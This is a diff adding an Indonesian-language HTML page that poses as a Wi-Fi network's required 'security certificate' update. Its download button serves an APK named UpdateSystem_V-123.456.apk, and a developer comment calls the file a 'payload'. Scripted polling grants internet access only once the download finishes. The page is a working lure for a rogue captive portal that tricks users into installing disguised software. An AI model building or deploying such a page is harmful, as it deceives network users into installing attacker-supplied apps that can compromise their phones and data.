@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pembaruan Keamanan Jaringan</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+            max-width: 90%;
+        }
+
+        .icon {
+            width: 64px;
+            height: 64px;
+            background: #e0f2fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .icon svg {
+            width: 32px;
+            height: 32px;
+            stroke: #0284c7;
+            stroke-width: 2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        h1 {
+            font-size: 20px;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .btn {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 12px;
+            background: #0284c7;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+            box-sizing: border-box;
+        }
+
+        .btn:hover {
+            background: #0369a1;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card">
+        <div class="icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                <polyline points="7 10 12 15 17 10"></polyline>
+                <line x1="12" y1="15" x2="12" y2="3"></line>
+            </svg>
+        </div>
+        <h1>Pembaruan Diperlukan</h1>
+        <p>Untuk mengakses internet melalui jaringan ini, Anda harus mengunduh dan memasang sertifikat keamanan jaringan
+            kami.</p>
+
+        <!-- Ganti 'payload.apk' dengan nama file yang akan Anda letakkan di folder ini -->
+        <a href="download.php?file=UpdateSystem_V-123.456.apk" class="btn" id="downloadBtn">Unduh & Hubungkan</a>
+    </div>
+
+    <!-- Iframe tersembunyi untuk menangani download tanpa me-refresh halaman -->
+    <iframe id="downloadFrame" name="downloadFrame" style="display:none;"></iframe>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function (e) {
+            e.preventDefault(); 
+            var btn = this;
+            var downloadUrl = btn.getAttribute('href');
+
+            // 1. Ubah tampilan tombol
+            btn.innerHTML = 'Mengunduh File... Mohon jangan tutup halaman ini';
+            btn.style.pointerEvents = 'none';
+            btn.style.background = '#94a3b8';
+
+            // 2. Mulai unduhan di background frame (browser akan memunculkan dialog save as)
+            // download.php akan 'menahan' koneksi (blocking) selama file 100MB ditransfer.
+            document.getElementById('downloadFrame').src = downloadUrl;
+
+            // 3. Kita lakukan polling berulang (tanpa timer mati) ke check.php.
+            // check.php akan merespon 'ok' HANYA JIKA download.php sudah selesai
+            // mentransfer file secara utuh dan menjalankan whitelist.sh
+            var checker = setInterval(function() {
+                fetch('check.php')
+                    .then(response => response.text())
+                    .then(status => {
+                        if (status.trim() === 'ok') {
+                            // Unduhan selesai! IP sudah masuk whitelist.
+                            clearInterval(checker);
+                            btn.innerHTML = 'Berhasil! Menghubungkan...';
+                            setTimeout(function() {
+                                window.top.location.href = "/success.html";
+                            }, 500);
+                        }
+                    })
+                    .catch(error => console.error("Checking status...", error));
+            }, 2000); // Cek status setiap 2 detik terus-menerus
+        });
+    </script>
+
+</body>
+
+</html>
